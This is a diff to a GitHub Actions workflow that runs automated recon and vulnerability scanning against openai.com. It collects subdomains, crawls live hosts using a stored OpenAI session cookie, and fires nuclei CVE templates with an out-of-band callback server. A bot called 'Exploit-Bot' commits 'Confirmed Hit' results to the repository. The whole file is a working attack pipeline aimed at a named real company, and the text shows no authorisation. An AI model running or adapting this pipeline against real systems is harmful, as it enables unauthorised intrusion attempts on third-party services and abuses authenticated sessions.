@@ -12,8 +12,9 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
       - name: Setup Tools
         run: |
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
@@ -27,36 +28,40 @@ jobs:
           PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
-          # 1. Use a unique folder name to prevent 'Permission Denied' or 'Already Exists'
-          WORK_DIR="data_vault"
-          rm -rf $WORK_DIR || true
-          mkdir -p $WORK_DIR
+          # Use Absolute Workspace Path to avoid Exit Code 2
+          BASE_DIR="${{ github.workspace }}"
+          DATA_DIR="$BASE_DIR/recon_storage"
           
-          # 2. Discovery
-          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt
-          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt
-          cat subs.txt | sort -u | httpx -silent -t 50 -o $WORK_DIR/alive.txt
+          # Clean and Create
+          rm -rf "$DATA_DIR" || true
+          mkdir -p "$DATA_DIR"
           
-          # 3. Authenticated Crawl
-          touch $WORK_DIR/params_new.txt
-          katana -list $WORK_DIR/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o $WORK_DIR/params_new.txt || true
+          # Ensure master params exists in root
+          touch "$BASE_DIR/params.txt"
           
-          # 4. Delta Logic using the existing params.txt in the repo root
-          touch params.txt
-          if [ -s $WORK_DIR/params_new.txt ]; then
-             grep -vFf params.txt $WORK_DIR/params_new.txt > $WORK_DIR/to_scan.txt || touch $WORK_DIR/to_scan.txt
+          # 1. Discovery
+          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > "$DATA_DIR/subs.txt"
+          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> "$DATA_DIR/subs.txt" || true
+          cat "$DATA_DIR/subs.txt" | sort -u | httpx -silent -t 50 -o "$DATA_DIR/alive.txt"
+          
+          # 2. Authenticated Crawling
+          katana -list "$DATA_DIR/alive.txt" -jc -kf all -d 2 -H "Cookie: $COOKIE" -o "$DATA_DIR/params_new.txt" || touch "$DATA_DIR/params_new.txt"
+          
+          # 3. Delta Logic (Scan only new URLs)
+          if [ -s "$DATA_DIR/params_new.txt" ]; then
+             grep -vFf "$BASE_DIR/params.txt" "$DATA_DIR/params_new.txt" > "$DATA_DIR/to_scan.txt" || cp "$DATA_DIR/params_new.txt" "$DATA_DIR/to_scan.txt"
           else
-             touch $WORK_DIR/to_scan.txt
+             touch "$DATA_DIR/to_scan.txt"
           fi
           
-          # 5. Prepare master update
-          cat params.txt $WORK_DIR/params_new.txt | sort -u > $WORK_DIR/master_params_updated.txt
+          # 4. Merge results for the next run
+          cat "$BASE_DIR/params.txt" "$DATA_DIR/params_new.txt" | sort -u > "$DATA_DIR/master_params_updated.txt"
 
       - name: Save Recon Data
         uses: actions/upload-artifact@v4
         with:
           name: targets
-          path: data_vault/
+          path: recon_storage/
 
   fuzz:
     needs: recon
@@ -70,7 +75,7 @@ jobs:
       - uses: actions/download-artifact@v4
         with:
           name: targets
-          path: data_vault/
+          path: recon_storage/
 
       - name: Setup & Update Nuclei
         run: |
@@ -78,24 +83,24 @@ jobs:
           echo "$HOME/go/bin" >> $GITHUB_PATH
           $HOME/go/bin/nuclei -ut
 
-      - name: Advanced Vulnerability Scanning
+      - name: Parallel Attack
         env:
           ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
           PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
-          mkdir -p hits
-          if [ -s data_vault/to_scan.txt ]; then
-            nuclei -l data_vault/to_scan.txt \
+          mkdir -p hits_folder
+          if [ -s recon_storage/to_scan.txt ]; then
+            nuclei -l recon_storage/to_scan.txt \
               -tags ${{ matrix.vuln_type }},cve2025,cve2026 \
               -auth $PDCP_API_KEY \
               -interactsh-server oast.fun \
               -header "Cookie: $COOKIE" \
               -rate-limit 100 \
-              -o hits/${{ matrix.vuln_type }}_hits.txt
+              -o hits_folder/${{ matrix.vuln_type }}_hits.txt
           fi
 
-      - name: Atomic Save Findings
+      - name: Atomic Save
         run: |
           git config --local user.email "bot@hacker.ai"
           git config --local user.name "Exploit-Bot"
@@ -104,18 +109,21 @@ jobs:
             git fetch origin main
             git rebase origin/main || (git rebase --abort && git reset --hard origin/main)
             
-            # Sync the new master params
-            [ -f data_vault/master_params_updated.txt ] && cp data_vault/master_params_updated.txt params.txt
+            # Sync master list
+            [ -f recon_storage/master_params_updated.txt ] && cp recon_storage/master_params_updated.txt params.txt
             
-            # Add hits if they exist
+            # Save hits
             mkdir -p final_results
-            [ "$(ls -A hits/)" ] && cp hits/*.txt final_results/
+            if [ -d hits_folder ] && [ "$(ls -A hits_folder/)" ]; then
+              cp hits_folder/*.txt final_results/
+            fi
             
             git add params.txt final_results/
             
             if git commit -m "Confirmed Hit: ${{ matrix.vuln_type }} $(date)"; then
               git push origin main && break
             else
+              echo "Nothing to commit"
               break
             fi
             sleep $(( (RANDOM % 20) + 10 ))
